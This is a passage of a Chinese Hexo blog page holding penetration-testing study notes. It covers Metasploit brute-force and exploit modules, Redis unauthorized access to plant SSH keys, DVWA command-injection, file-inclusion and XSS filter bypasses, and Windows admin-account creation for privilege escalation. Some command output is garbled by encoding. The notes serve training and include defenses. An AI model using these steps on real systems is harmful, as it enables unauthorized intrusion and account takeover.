class="line"></span><br><span class="line">使用showmount命令确定“/&quot;共享（文件系统的根）是否正在导出。</span><br><span class="line"></span><br><span class="line">需要nfs-common包支持才可用`showmount`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>showmount -e IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 查看导出内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>mkdir nfs_root   	#创建保存导出文件的文件夹<br>mount -t nfs IP:&#x2F; ~&#x2F;nfs_root -o nolock 			#-t 导出使用的类型，-o 不加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### proftpd</span><br><span class="line"></span><br><span class="line">unix上的ftp服务器程序</span><br><span class="line"></span><br><span class="line">#### exploit-db搜索目标漏洞</span><br><span class="line"></span><br><span class="line">`searchsploit 	漏洞`</span><br><span class="line"></span><br><span class="line">#### msf暴力破解密码</span><br><span class="line"></span><br><span class="line">`auxiliary/scanner/ftp/ftp_login`</span><br><span class="line"></span><br><span class="line">### mysql</span><br><span class="line"></span><br><span class="line">#### 探测mysql</span><br><span class="line"></span><br><span class="line">- nmap</span><br><span class="line">  - `nmap -sV -p 3306 IP`</span><br><span class="line"></span><br><span class="line">#### 弱口令破解</span><br><span class="line"></span><br><span class="line">- msfconsole</span><br><span class="line">  - `auxiliary/scanner/mysql/mysql_login`</span><br><span class="line"></span><br><span class="line">#### 登录数据库</span><br><span class="line"></span><br><span class="line">`mysql -h IP -u root`</span><br><span class="line"></span><br><span class="line">### postgresql</span><br><span class="line"></span><br><span class="line">对象关系型数据库</span><br><span class="line"></span><br><span class="line">#### 探测目标</span><br><span class="line"></span><br><span class="line">- nmap</span><br><span class="line">  - `nmap -sV -p 5432 IP`</span><br><span class="line"></span><br><span class="line">#### 用户名破解</span><br><span class="line"></span><br><span class="line">- msfconsole</span><br><span class="line">  - `auxiliary/scanner/postgres/postgres_login`</span><br><span class="line"></span><br><span class="line">#### 代码执行利用</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">`exploit/linux/psotgres/postgres_payload`</span><br><span class="line"></span><br><span class="line">#### 防御</span><br><span class="line"></span><br><span class="line">屏蔽任意IP连接Postgresql</span><br><span class="line"></span><br><span class="line">### VNC</span><br><span class="line"></span><br><span class="line">虚拟网络控制台，一款优秀的远程控制工具。默认端口为5900</span><br><span class="line"></span><br><span class="line">#### 探测</span><br><span class="line"></span><br><span class="line">`nmap -sV -p 5900 IP`</span><br><span class="line"></span><br><span class="line">#### 破解密码</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">`auxiliary/scanner/vnc/vnc_login`</span><br><span class="line"></span><br><span class="line">### irc</span><br><span class="line"></span><br><span class="line">互联网中继聊天，速度快，占用带宽小。运行端口6667</span><br><span class="line"></span><br><span class="line">#### 探测</span><br><span class="line"></span><br><span class="line">`nmap -sV -p 6667 IP`</span><br><span class="line"></span><br><span class="line">#### 利用后门</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">`exploit/unix/irc/unreal_ircd_3281_backdoor`</span><br><span class="line"></span><br><span class="line">### tomcat</span><br><span class="line"></span><br><span class="line">免费开源web应用服务器，属于清凉及用用服务器。默认端口8180-管理端口</span><br><span class="line"></span><br><span class="line">#### 探测</span><br><span class="line"></span><br><span class="line">`nmap -sV -p 8180 IP`</span><br><span class="line"></span><br><span class="line">#### 爆破密码</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">`auxiliary/scanner/http/tomcat_mgr_login`</span><br><span class="line"></span><br><span class="line">#### 反弹shell</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">`use exploit/multi/http/tomcat_mgr_deploy`</span><br><span class="line"></span><br><span class="line">#### 防御</span><br><span class="line"></span><br><span class="line">修改密码</span><br><span class="line"></span><br><span class="line">### redis</span><br><span class="line"></span><br><span class="line">非关系型数据库（nosql）默认端口6379</span><br><span class="line"></span><br><span class="line">#### 未授权访问</span><br><span class="line"></span><br><span class="line">`redis-cli -h IP`</span><br><span class="line"></span><br><span class="line">#### 未授权访问修复</span><br><span class="line"></span><br><span class="line">1. 配置bind选项，限制连接redis服务器IP，修改默认端口</span><br><span class="line">2. 配置认证，设置requirepass参数</span><br><span class="line"></span><br><span class="line">#### 远程登录权限</span><br><span class="line"></span><br><span class="line">##### 原理</span><br><span class="line"></span><br><span class="line">本地生成密钥，利用redis未授权访问漏洞，上传公钥到服务器用户目录下。</span><br><span class="line"></span><br><span class="line">利用ssh密钥对远程登录系统</span><br><span class="line"></span><br><span class="line">##### 生成密钥</span><br><span class="line"></span><br><span class="line">`ssh-keygen -t rsa`</span><br><span class="line"></span><br><span class="line">##### 利用redis上传公钥</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>(echo -e “\n\n”; cat id rsa.pub;echo -e “\n\n”)&gt;foo.txt</p>
+<h1 id="echo-e-转义生效"><a href="#echo-e-转义生效" class="headerlink" title="echo -e 转义生效"></a>echo -e 转义生效</h1><p>cat foo.txt | redis-cli -h IP -x set crackit<br>#读取文件到redis标准输入流中，并取名为crackit<br>redis-cli -h IP<br>config set dir &#x2F;root&#x2F;.ssh&#x2F;<br>config get dir PATH<br>config set dbfilename “authorized_keys”<br>save</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 利用密钥比对登录系统</span><br><span class="line"></span><br><span class="line">`ssh -i id_rsa IP`</span><br><span class="line"></span><br><span class="line">## DVWA</span><br><span class="line"></span><br><span class="line">### 暴力破解</span><br><span class="line"></span><br><span class="line">#### low&amp;medium</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>get请求<br>GET &#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;?username&#x3D;admin&amp;password&#x3D;a&amp;Login&#x3D;Login<br>直接使用burp攻击使用字典即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### high</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>GET &#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;?username&#x3D;admin&amp;password&#x3D;s&amp;Login&#x3D;Login&amp;user_token&#x3D;019f23ffacb0e296497ba9eef403b961 HTTP&#x2F;1.1<br>相比前两个等级，多了个token，每次提交都会刷新。无法直接使用burp攻击。</p>
+<p>#pyehon3<br>#获取token<br>def get_token(url, headers):<br>    r &#x3D; requests.get(url, header&#x3D;header)<br>    html &#x3D; r.content.decode()<br>    soup &#x3D; BeautifulSoup(html, “html.parser”)<br>    user_token &#x3D; soup.find_all(‘input’)[3][‘value’]<br>    return user_token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 命令执行</span><br><span class="line"></span><br><span class="line">#### low</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>提交<br>Enter an IP address:127.0.0.1</p>
+<p>结果<br>���� Ping 127.0.0.1 ���� 32 �ֽڵ�����:<br>���� 127.0.0.1 �Ļظ�: �ֽ�&#x3D;32 ʱ��&lt;1ms TTL&#x3D;64<br>���� 127.0.0.1 �Ļظ�: �ֽ�&#x3D;32 ʱ��&lt;1ms TTL&#x3D;64<br>���� 127.0.0.1 �Ļظ�: �ֽ�&#x3D;32 ʱ��&lt;1ms TTL&#x3D;64<br>���� 127.0.0.1 �Ļظ�: �ֽ�&#x3D;32 ʱ��&lt;1ms TTL&#x3D;64</p>
+<p>127.0.0.1 �� Ping ͳ����Ϣ:<br>    ���ݰ�: �ѷ��� &#x3D; 4���ѽ��� &#x3D; 4����ʧ &#x3D; 0 (0% ��ʧ)��<br>�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):<br>    ��� &#x3D; 0ms��� &#x3D; 0ms��ƽ�� &#x3D; 0ms</p>
+<pre><code>提交
+Enter an IP address:127.0.0.1 | ipconfig
+
+结果
+Windows IP ����
+</code></pre>
+<p>��̫�������� ��̫��:</p>
+<p>   �����ض��� DNS ��׺ . . . . . . . :<br>   �������� IPv6 ��ַ. . . . . . . . : fe80::503a:7264:59c2:7587%2<br>   IPv4 ��ַ . . . . . . . . . . . . : 10.2.85.61<br>   ��������  . . . . . . . . . . . . : 255.255.255.0<br>   Ĭ������. . . . . . . . . . . . . : 10.2.85.1</p>
+<p>���߾����������� WLAN:</p>
+<p>   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�����<br>   �����ض��� DNS ��׺ . . . . . . . : </p>
+<p>���߾����������� ��������* 1:</p>
+<p>   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�����<br>   �����ض��� DNS ��׺ . . . . . . . : </p>
+<p>���߾����������� ��������* 2:</p>
+<p>   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�����<br>   �����ض��� DNS ��׺ . . . . . . . : </p>
+<p>��̫�������� VMware Network Adapter VMnet1:</p>
+<p>   �����ض��� DNS ��׺ . . . . . . . :<br>   �������� IPv6 ��ַ. . . . . . . . : fe80::795b:d7b0:a549:fffc%20<br>   IPv4 ��ַ . . . . . . . . . . . . : 192.168.201.1<br>   ��������  . . . . . . . . . . . . : 255.255.255.0<br>   Ĭ������. . . . . . . . . . . . . : </p>
+<p>��̫�������� VMware Network Adapter VMnet8:</p>
+<p>   �����ض��� DNS ��׺ . . . . . . . :<br>   �������� IPv6 ��ַ. . . . . . . . : fe80::62:6ef8:47bf:dba3%8<br>   IPv4 ��ַ . . . . . . . . . . . . : 192.168.26.1<br>   ��������  . . . . . . . . . . . . : 255.255.255.0<br>   Ĭ������. . . . . . . . . . . . . : </p>
+<p>��̫�������� ������������:</p>
+<p>   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�����<br>   �����ض��� DNS ��׺ . . . . . . . : </p>
+<p>���������� Teredo Tunneling Pseudo-Interface:</p>
+<p>   �����ض��� DNS ��׺ . . . . . . . :<br>   IPv6 ��ַ . . . . . . . . . . . . : 2001:0:2851:b9f0:e8:1c51:2229:e471<br>   �������� IPv6 ��ַ. . . . . . . . : fe80::e8:1c51:2229:e471%13<br>   Ĭ������. . . . . . . . . . . . . : ::</p>
+<p>   成功实现命令执行<br>   ping 127.0.0.1 &amp;&amp; ipconfig<br>   都执行<br>   ping 127.0.0.1 &amp; ipconfig<br>   都执行<br>   ping 127.0.0.1 || ipconfig<br>   当第一条命令执行失败才执行第二条<br>   ping 127.0.0.1 | ipconfig<br>   都执行<br>   ping 127.0.0.1 ; ipconfig<br>   windows没有;分隔符，会报错<br>   linux可以用;分割</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### medium</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>使用黑名单<br>过滤&amp;&amp; 和 ;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### high</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>依旧是黑名单<br>&amp;、;、| 、-、$、(、)、&#96;、||</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 防御方法</span><br><span class="line"></span><br><span class="line">1. 过滤黑名单</span><br><span class="line">2. 替换、转义关键字</span><br><span class="line">3. 对于IP地址，用&#x27;.&#x27;分界，将数字拆分到数组，单个判断是否为数字。</span><br><span class="line"></span><br><span class="line">### CSRF</span><br><span class="line"></span><br><span class="line">#### low</span><br><span class="line"></span><br><span class="line">最基础的csrf，点击测试验证，登陆后直接修改密码即可</span><br><span class="line"></span><br><span class="line">#### medium</span><br><span class="line"></span><br><span class="line">对报文头进行验证，检测referer</span><br><span class="line"></span><br><span class="line">#### high</span><br><span class="line"></span><br><span class="line">相较中级添加了token，token可以防御大部分csrf。</span><br><span class="line"></span><br><span class="line">破解token可以使用存储型XSS来获取token，继续实现csrf。</span><br><span class="line"></span><br><span class="line">#### impossible</span><br><span class="line"></span><br><span class="line">在token的基础上，需要输入用户当前密码。</span><br><span class="line"></span><br><span class="line">需要其他攻击配合单纯csrf无法获取用户密码</span><br><span class="line"></span><br><span class="line">### 文件包含漏洞</span><br><span class="line"></span><br><span class="line">文件包含漏洞是因为开启了两个选项`allow_url_include`和`allow_url_fopen`</span><br><span class="line"></span><br><span class="line">文件包含漏洞分为两种：本地文件包含漏洞和远程文件包含漏洞</span><br><span class="line"></span><br><span class="line">allow_url_include：开启后，可以使用php函数（include(),require(),include_one(),require_one()）利用url区动态包含文件。属于本地文件包含漏洞。</span><br><span class="line"></span><br><span class="line">- require：会产生知名错误并停止脚本</span><br><span class="line">- include：只生成警告，并且脚本会继续</span><br><span class="line"></span><br><span class="line">allow_url_fopen：开启后，服务器允许包含一个远程文件。属于远程包含漏洞。</span><br><span class="line"></span><br><span class="line">#### low</span><br><span class="line"></span><br><span class="line">直接在page=后面修改参数即可</span><br><span class="line"></span><br><span class="line">#### medium</span><br><span class="line"></span><br><span class="line">添加了过滤，会过滤http://、https:// 、../、..\</span><br><span class="line"></span><br><span class="line">但是只过滤一次</span><br><span class="line"></span><br><span class="line">可以复写http，如hthttp://tp://</span><br><span class="line"></span><br><span class="line">#### high</span><br><span class="line"></span><br><span class="line">添加了fnmatch()，必须以file开头</span><br><span class="line"></span><br><span class="line">但是依然可以绕过`file://E:\\phpstudy\\*`</span><br><span class="line"></span><br><span class="line">### 文件上传漏洞</span><br><span class="line"></span><br><span class="line">#### low</span><br><span class="line"></span><br><span class="line">没有过滤，直接上传，访问对应的路径即可</span><br><span class="line"></span><br><span class="line">#### medium</span><br><span class="line"></span><br><span class="line">白名单过滤，只能用jped和png格式</span><br><span class="line"></span><br><span class="line">#### high</span><br><span class="line"></span><br><span class="line">白名单：jpg、jpeg、png</span><br><span class="line"></span><br><span class="line">检测文件大小</span><br><span class="line"></span><br><span class="line">getimagesize()：检测文件头，判断是否是图片文件</span><br><span class="line"></span><br><span class="line">#### impossible</span><br><span class="line"></span><br><span class="line">md5文件重命名</span><br><span class="line"></span><br><span class="line">#### 防御方法</span><br><span class="line"></span><br><span class="line">1. 文件重命名（导致%00截断无法绕过过滤）</span><br><span class="line"></span><br><span class="line">2. 加入token</span><br><span class="line"></span><br><span class="line">3. 加强文件内容检测</span><br><span class="line"></span><br><span class="line">### xss</span><br><span class="line"></span><br><span class="line">#### medium</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line"></span><br><span class="line">#### high</span><br><span class="line"></span><br><span class="line">过滤了script</span><br><span class="line"></span><br><span class="line">但可以使用其他标签：img</span><br><span class="line"></span><br><span class="line">### session ID</span><br><span class="line"></span><br><span class="line">#### low</span><br><span class="line"></span><br><span class="line">session id从零开始自增，容易猜测</span><br><span class="line"></span><br><span class="line">#### medium</span><br><span class="line"></span><br><span class="line">session id 为当前事件，经过收集容易破解</span><br><span class="line"></span><br><span class="line">#### high</span><br><span class="line"></span><br><span class="line">md5加密</span><br><span class="line"></span><br><span class="line">#### 防御</span><br><span class="line"></span><br><span class="line">1. 随机起始值</span><br><span class="line"></span><br><span class="line">## 提权</span><br><span class="line"></span><br><span class="line">#### 提权分类</span><br><span class="line"></span><br><span class="line">提权分为本地提权和远程提权</span><br><span class="line"></span><br><span class="line">提权分为系统提权和第三方原件提权</span><br><span class="line"></span><br><span class="line">#### 获取IP地址</span><br><span class="line"></span><br><span class="line">`ipconfig /all`</span><br><span class="line"></span><br><span class="line">#### 查看开启服务</span><br><span class="line"></span><br><span class="line">`net start`</span><br><span class="line"></span><br><span class="line">#### 结束进程</span><br><span class="line"></span><br><span class="line">`taskkill`</span><br><span class="line"></span><br><span class="line">#### 用户管理</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>net user username password &#x2F;add<br>net localgroup administrator username &#x2F;add</p>
+<pre><code>
+### 提权辅助工具
+
+python2 的模块：xlrd
+
+windows-exploit-suggester.py
+
+#### 远程提权
+
+**ms17-010**
+
+需要开启服务器消息快1.0（SMBv1）服务（445端口）
+
+msfconsole
+
+**ms11-046**
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/" data-id="clfpg8ztq000pvwv5bvs254zr" data-title="网络安全训练营" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/12/01/XSS/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          XSS
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/12/01/webSecurity/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">webSecurity</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/Log4j/">Log4j</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/OWASP/">OWASP TOP 10</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/kali/">kali</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 HOU<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
